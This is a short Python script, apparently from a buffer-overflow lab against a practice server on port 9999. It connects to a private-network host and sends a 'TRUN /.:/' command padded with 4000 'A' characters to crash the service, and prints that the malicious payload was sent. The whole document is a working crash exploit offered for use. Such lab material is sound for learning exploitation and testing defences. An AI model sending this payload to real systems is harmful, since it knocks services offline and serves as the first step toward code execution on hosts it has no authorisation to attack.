#!/usr/bin/python
import socket

victim_host = "10.0.2.4"
port = 9999

payload = "A" * 4000    # data to crash the application
buffer_exploit = "TRUN /.:/" + payload # the command to community with our application


# socket connection to the program's port
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)

print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()


